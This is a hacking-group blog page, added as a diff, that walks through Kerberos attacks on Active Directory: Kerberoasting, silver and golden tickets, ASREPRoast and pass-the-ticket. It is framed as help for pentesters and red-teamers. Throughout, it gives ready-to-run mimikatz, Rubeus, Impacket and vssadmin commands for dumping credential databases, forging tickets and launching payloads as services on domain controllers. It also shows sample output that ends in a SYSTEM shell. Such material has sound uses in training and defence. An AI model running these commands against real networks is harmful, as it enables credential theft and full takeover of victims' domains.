@@ -1,0 +1,255 @@
+<html>
+	<head>
+		<title>perseph0ne</title>
+		<meta charset="utf-8">
+	<style>
+		@font-face { font-family: "gohu"; src: url("../assets/gohu.woff") format('woff'); }
+		body {
+			color: #cccccc;
+			background-color: #0c0d10;
+		}
+
+		pre { font-family: "gohu"; font-size: 14px; line-height: 1.0; }
+		a { text-decoration: none; color: grey; } 
+	</style>
+	</head>
+	<body>
+	<center><img src="https://www.game.guide/wp-content/uploads/2021/11/Persephone_Art-1024x1024.png" width="25%"><br><div style="display: inline-block; text-align: left;"><pre>
+In pentest/red team operations, it's pretty normal abuse kerberos, in a lateral movement
+process, even in horizontal movement we can abuse kerberos... But, a lot hackers have
+trouble abusing kerberos. Thinking about that, we write this post to help these hackers.
+We hope you learn something by reading us :)
+
+First of all, kerberos is a bit complex, and attacks around it can also be a bit confusing,
+we'll clarify as much as possible these attacks...
+
+<b>-------------------------------------- Kerberoasting -----------------------------------------</b>
+
+The Kerberoasting attack, maybe, one of the most beautiful attacks around kerberos, allows you
+to move horizontally through your compromised host, the beauty of this attack that you don't
+need a high-privileged user, if you've a low-privileged user you can kerberoast.
+
+This attack basically consists of starting from a low-privileged user, get a ticket to
+impersonate a high-privileged user, but, the user that you need to request needs to be
+"kerberoastable", this means the target account must have one or more SPNs.
+
+To identify a kerberoastable user, you can use Bloodhound (not recommended due high traffic),
+or list SPNs, using impacket toolkit or with powershell modules... Many ways to list SPNs.
+
+A simple way to list SPNs is using <a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1">GetUsersSPNs.ps1</a>
+
+.\GetUserSPNs.ps1
+
+And, knowing the kerberoastable users (with one or more SPNs), we just need to kerberoast,
+requesting a ticket to impersonate any SPN user. Of course, over time, several automated
+ways to kerberoast emerged. 
+
+Manually, you need to use KerberosRequestorSecurityToken after enumerate SPNs
+
+Add-Type -AssemblyName System.IdentityModel
+New-Object SystemIdentityModel.Tokens.KerberosRequestorSecurtiyToken -ArgumentList *spn_user*
+
+After request, you can easily export all tickets by using mimikatz and crack them
+using john, hashcat or other crack tool...
+
+mimikatz # kerberos::list /export
+
+kirbi2john.py ticket.kirbi >ticket.hash
+john --wordlist=dict.txt ticket.hash
+
+
+But, we can kerberoast with automated powershell modules, Impacket toolkit, Rubeus, Empire...
+
+Impacket: 
+./GetUserSPNs.py -request-user *spn_user* -hashes lm:ntlm -dc-ip *ip* domain/compromised_username 
+
+Powershell Empire (Invoke-Kerberoast):
+import-Module Invoke-Kerberoast.ps1
+Invoke-Kerberoast
+
+Rubeus:
+.\Rubeus.exe kerberoast /outfile:kerberoasted.hashes
+
+
+And when you crack ticket, you can finally psexec...
+
+./psexec.py domain/user:pass@ip
+
+<b>-------------------------------------- Silver Ticket -----------------------------------------</b>
+
+The silver ticket attack grants to hacker access to any service running in the compromised machine,
+once you've compromised a SPN user (e.g by kerberoasting), you're able to silver ticket...
+
+When you're in a red team operation, for example, you've tasks that you complete, a silver ticket
+might be a good idea since they have great potential in a horizontal movement, or, for data exfiltration
+purposes...
+
+However, lets talk about the actual attack. 
+
+First of all, you need the NTLM hash of SPN user that you've compromised, if you haven't the NTLM hash,
+you can easily convert plaintext password to ntlm by using powershell.
+
+Import-Module DSInternals
+ConvertTo-NTHash 'password'
+
+And, you also need the Domain SID which you can easily identify by using a powershell single command
+
+Get-ADDomain | Select-String -Pattern "DomainSID"
+
+Now, we are ready to silver ticket... But, before we start attack, we need to know how this attack
+works. Basically, since kerberos allows services to login since they have a valid ticket, when hacker, 
+with an SPN privilege, create a forged service ticket (silver ticket) and use it to impersonate the
+target service...
+
+We can easily silver ticket by using <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>
+
+mimikatz # kerberos::golden /sid:sid /domain:domain_name /ptt (pass-the-ticket, we'll talk about it later) 
+/target:hostname /service:mssql (e.g) /rc4:ntlm_hash /user:FakeUser /id:1111
+
+mimikatz # misc::cmd 
+
+After launch cmd, you can run klist command and you'll see the ticket is already impersonated.
+Then you can just access and manage the target service...
+
+<b>-------------------------------------- Golden Ticket -----------------------------------------</b>
+
+The golden ticket attack is problably the most powerfull attack around kerberos. The golden ticket,
+provide to you access to any resource connected in AD (Active Directory), once you have the krbtgt
+hash, that you can get by hashdumping domain controller.
+
+A safe way to dump the ntds.dit file and get krbtgt hash, is to create a volume shadow (vss) and
+and extract ntds.dit from shadow volume, you can also use mimikatz to easily dump krbtgt hash, but,
+of course, mimikatz is normally detected...
+
+vssadmin create shadow /for=C:
+copy \\?\NAME\Windows\ntds\ntds.dit C:\temp\ntds.dit
+copy \\?\NAME\Windows\System32\config\SYSTEM C:\temp\SYSTEM
+vssadmin delete shadows /shadow={?-?-?-?-?}
+
+After extract ntds.dit file and SYSTEM registry, you can easily dump it locally by using impacket
+toolkit (secretsdump.py)
+
+secretsdump.py  -system SYSTEM -ntds ntds.dit LOCAL
+
+If you're in a safe environment, you can easily dump krbtgt by using mimikatz
+
+mimikatz # lsadump::dcsync /domain:domain /user:krbtgt
+
+You will also need Domain SID and Domain Name.
+
+Get-ADDomain
+
+Now, you're able to golden ticket, and the process is almost the same of silver ticket. But,
+with krbtgt user, we can generate TGTs instead TGSs, and a TGT signed by krbtgt can access any
+resource connected to AD, which takes this attack to another different proportion than silver
+ticket...
+
+Its pretty easy impersonate the golden ticket by using Mimikatz
+
+mimikatz # kerberos::golden /domain:domain.name /sid:sid /rc4:krbtgtHash /id:1111 /user:FakeUser
+mimikatz # kerberos::ptt ticket.kirbi
+mimikatz # misc::cmd
+
+And after launch cmd, you shold have your golden ticket impersonated. And, with a golden
+ticket impersonated, you already can psexec, or drop and execute your payload...
+
+PsExec.exe \\mail cmd.exe
+
+Or generate a service payload and
+
+sc \\dc01 create pwn binpath=C:\path\to\your\payload.exe[SC] CreateService SUCCESS
+sc \\dc01 start pwn
+
+And your beacon/meterpreter or any agent that you are using, should be running in the
+target machine
+
+-------------------------------------- ASREPRoast -----------------------------------------
+
+The attack consists of looking for users without the need for kerberos pre-authentication,
+that is, users with the DONT_REQ_PREAUTH attribute set. This means that any user can send 
+an AS_REQ, which is a request for a TGT made to the KDC (Key Distribution Center) on 
+behalf of any of these users and receiving an AS_REP message, which send TGT by KDC.
+
+In the same message, it contains a piece of data encrypted with the hash of an original 
+user, resulting from his password, so we can use the hash to crack the offline users
+password.
+
+No domain account is required to carry out the attack. However, with an account in the 
+domain, one way to get users who don't need  pre-authentication is to perform an LDAP 
+query, using the following filter:
+
+(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
+
+Without a domain account, we can use the GetNPUsers.py script on a linux machine so 
+that we can collect AS_REP responses from users with the DONT_REQ_PREAUTH attribute set on 
+their account. We will pass a given list of usernames to get the list of users giving the 
+domain name, like this:
+
+(x3h):~# python GetNPUsers.py dn1.local/ -usersfile users.txt -format hashcat 
+-outputfile hashes.asreproast
+
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation
+[-] User example1 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User example2 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+(x3h):~# cat hashes.asreproast 
+$krb5asrep$23$example1@DN1.LOCAL:7c2e70d3d46b4794b95.............
+
+After receiving the AS_REP along with the users hash, we can crack it using hashcat.
+Note: on a windows machine, you can use the Rubeus tool to carry out the attack. 
+
+-------------------------------------- Pass-The-Ticket -----------------------------------------
+
+Let us now understand the concept of ptt (pass the ticket), and how it can be useful... We
+already see how to kerberoast, but, the kerberoasting attack could might be effective if
+we crack the ticket and get plaintext password... But this ins't interesting for us,
+the ptt came to solve this problem.
+
+We already talk and did ptt attacks in this same post, and well, the ptt attack basically consists
+of using the ticket as password, we just need the ticket to login, without having to crack the
+ticket, or relying on dictionary attacks...
+
+In this same post, we used ptt for load the ticket into memory (impersonated it) by using mimikatz, 
+but, in a kerberoasting attack, will be a bit more complex, because we cant use mimikatz, and we
+don't have how to remote ptt with kirbi file without mimikatz, or other automated tool... But,
+using Impacket toolkit we can pass the ticket doing other process.
+
+First of all, we need to kerberoast and export tickets by using powershell and mimikatz
+
+.\GetUserSPNs.ps1
+
+Add-Type -AssemblyName System.IdentityModel
+New-Object SystemIdentityModel.Tokens.KerberosRequestorSecurtiyToken -ArgumentList *spn_user*
+
+mimikatz # kerberos::list /export
+
+Now, you need to download your ticket.kirbi and we will pass the ticket by using Impacket
+
+./kirbi2ccache ticket.kirbi ticket.ccache
+export KRB5CCNAME=/path/to/ticket.ccache; ./psexec -k -no-pass domain.local/spn_user@dc01
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation
+
+[*] Requesting shares on dc01.....
+[*] Found writable share ADMIN$
+[*] Uploading file HfwUeoSk.exe
+[*] Opening SVCManager on dc01.....
+[*] Creating service sBwp on dc01.....
+[*] Starting service sBwp.....
+[!] Press help for extra shell commands
+Microsoft Windows [Versión 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+<b>------------------------------------------------- End -------------------------------------------------</b>
+
+We hope that you have learned something from this post, and that you can enjoy the content that has 
+been made available here. Happy hacking
+
+Made by liz & x3h
+For perseph0ne
+
+	</pre></div></center>
+	</body>
+</html>
